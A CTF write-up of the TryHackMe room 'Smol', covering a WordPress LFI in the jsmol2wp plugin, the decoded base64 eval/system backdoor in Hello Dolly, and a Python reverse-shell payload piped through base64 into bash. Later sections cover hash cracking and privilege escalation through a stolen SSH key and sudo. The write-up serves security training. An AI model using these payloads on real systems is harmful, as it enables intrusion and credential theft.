## Description

This is a Write-Up for the room Smol with a difficult level of *medium* on the TryHackMe platform. You can visit the room [here](https://tryhackme.com/r/room/smol).

The room provides us with a informative description.

> At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
> 
> Quick Tips: Do you know that on computers without GPU like the AttackBox, **John The Ripper** is faster than **Hashcat**?  
> 
> **Note:** Please allow 4 minutes for the VM to fully boot up.

## Initial Recon

As always I started with a `nmap` scan. I found out that two ports are open:
```
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
19124/tcp filtered unknown no-response
```
{: file='initial.nmap'}

The next thing I did is adding the IP address and domain to my `/etc/hosts` file.
```
10.10.52.188 www.smol.thm
```

The URL, which we can see at the top, looks like a typical WordPress application.
![](/assets/blog/Smol/wordpress.png)

## Exploiting the LFI

The next thing I did is running `wpscan`, this tool will enumerate the WordPress installation and looks for plugins, versions and more.

```sh
wpscan --url http://www.smol.thm/
```

**Note**: I changed my virtual machine from Parrot to Kali, because the tool is by default installed on that distribution and doesn't require setup.

![](/assets/blog/Smol/plugin.png)

I went through the output and found this plugin, I searched online for any known exploits.

![](/assets/blog/Smol/vuln.png)

This looks like the vulnerability we are searching for, I next checked the links related to [this](https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654) vulnerability and found [this PoC](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt) exploit.

![](/assets/blog/Smol/poc.png)

Apparently we can simply read the `wp-config.php` file which includes the database credentials and other information. I modified the URL from the PoC to `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`, this should give me the content of the config file.

![](/assets/blog/Smol/wpconf.png)

With that we got a password and a username from the config file. The next thing to do is checking the users present on the WordPress site. I used `wpscan` for that again:
```sh
wpscan --url http://www.smol.thm/ --enumerate u
```

We got the following users:
```

```

This is quite a long list of users. I firstly tried the password we already discovered in the `wp-config.php` file for the user *wpuser*. The `wpscan` for users confirms that we should try these credentials, because there is a user named `wordpress user`. So I logged in with these credentials which gave us access to the authors page of WordPress.

## Backdoor

I went through the WordPress pages and found a interesting private post.

![](/assets/blog/Smol/post.png)

The first bullet point looks interesting: There is a backdoor described inside the `Hello Dolly` plugin. I firstly googled what this plugin is. This plugin is an ancient plugin with no actual purpose, this is an ideal place for a backdoor. With some research I found out that the plugin lives under this URL: `http://www.smol.thm/wp-content/plugins/hello.php`, it doesn't really display anything, but we already have LFI to view files, so why not viewing the source code of this plugin. You can use this URL:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`

The code of that file looks suspicious (I truncated unnecessary lines):
```php
<?php

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "NOTIMPORTANT";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<NONSENSESTYLE>
	";
}

add_action( 'admin_head', 'dolly_css' );
```

The eval looks particularly malicious, which is why I decoded the `base64`.
The code which is run by the eval is a check whether the parameter `\143\155\x64` exists, if it exists it's used with the system command, which can execute code.
```php
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

This looks like a backdoor we can abuse. I next tried to figure out what that means. The first two chars we can simply decode with [Cyberchef](https://cyberchef.org/#recipe=From_Octal('Space')&input=MTQzIDE1NQ) with the `From Octal` method. The decoded characters are `cm`, in python we can run `chr(0x64)` which shows that this is a `d`, so the parameter we can use is `cmd`.

I next found out that the `hello.php` file and the function `hello_dolly` is called whenever we load the `wp-admin` page. So to get our reverse shell we can add the cmd parameter to the `/wp-admin` page and execute commands. T check if that works I first tried to `curl` my IP.

![](/assets/blog/Smol/check.png)

This works, which is why the next thing to do is getting a reverse shell. I used a encoded payload to escape the URL encoding problem. To do that I first created a file with my Python payload:
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.78.229",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
{: file='payload.txt'}
.. and generated the payload with:

```sh
echo "echo `cat payload.txt | base64 | tr -d '\n'` | base64 -d | bash"
```

I pasted the whole output of the command as the `cmd` parameter and got the reverse shell.


## Privilege Escalation

### diego
The first thing to do now is [stabilizing](https://www.jasonturley.xyz/how-to-stabilize-a-reverse-shell/) the reverse shell.

I next logged into the `mysql` database and checked the users and passwords:
```sql
use wordpress;
select user_login,user_pass from wp_users;
```

We got a list of hashes:
```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
```
Let's try to crack them. I transferred the hashes to my host inside a file and used john (self-build from GitHub repository) to 'crack' them.
```
./john --format=phpass --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt wordpress.txt
```

JohnTheRipper found one password, which success fully worked for the user `diego` on the machine:
![](/assets/blog/Smol/password.png)

Users on the machine:
```terminal
www-data@smol:/var/www/wordpress$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/usr/bin/bash
think:x:1000:1000:,,,:/home/think:/bin/bash
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```

With that we could get the user flag.

```terminal
diego@smol:~$ cat user.txt 
FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE
```

### think

As the user *diego*, we have access to every home folder because we are in the *internal* group.
```terminal
diego@smol:~$ id 
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
diego@smol:~$ ls -lh /home/
total 16K
drwxr-x--- 2 diego internal 4.0K Aug 18  2023 diego
drwxr-x--- 2 gege  internal 4.0K Aug 18  2023 gege
drwxr-x--- 5 think internal 4.0K Jan 12  2024 think
drwxr-x--- 2 xavi  internal 4.0K Aug 18  2023 xavi
```

With that we can read the `id_rsa` key of the user think:
```terminal
diego@smol:/home/think/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
```

I copied the key to my machine and set the permissions right (`chmod 600 id_rsa`). Now we got a useable shell on the machine.
```terminal
$ ssh -i id_rsa think@10.10.52.188
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
...
Last login: Sat Jan 25 11:43:17 2025 from 10.14.78.229
think@smol:~$ 
```

### gege

Now I tried finding other passwords on the server. In the `/opt` folder there is a SQL file, which includes passwords which differ from the passwords from `mysql`.
```
think@smol:/opt$ cat wp_backup.sql | grep '\$P\$' | grep -o "'\$P\$[A-Za-z0-9./]\{31\}'" | tr -d "'"
$P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1
$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BvcalhsCfVILp2SgttADny40mqJZCN/
```

I now tried cracking them too.
After about 10 minutes with my `RTX 3060`, I got this password:

![](/assets/blog/Smol/password2.png)

I tired it for *gege*, but wait what?
```terminal
think@smol:/opt$ su gege
gege@smol:/opt$ 
```

We didn't even need a password for *gege*.

**Note**: We need the password in the next step, so don't skip cracking it.

### xavi

I next checked the home folder and found a zip archive with old Wordpress data, this may include credentials, to extract this file we need a password, I tried the password we cracked for the user *gege* and it simply worked:

```terminal
gege@smol:~$ ls
wordpress.old.zip
gege@smol:~$ unzip wordpress.old.zip 
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password: 
```

The `wp-config.php` file contained some now credentials:

```terminal
gege@smol:~/wordpress.old$ cat wp-config.php | grep 'DB'
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'xavi' );
define( 'DB_PASSWORD', 'FAKEPWD' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```

I tired the credentials for the user *xavi*, this gave me a shell as *xavi*.

### root

Finally we need to get root, I checked *xavi's* `sudo` rights and found out that he can run anything as root:
```terminal
xavi@smol:/home/gege/wordpress.old$ sudo -l
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

With that we were able to get the root flag:
```
xavi@smol:/home/gege/wordpress.old$ sudo cat /root/root.txt
FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE
```

This challenge involved many steps and was all in all a nice box.
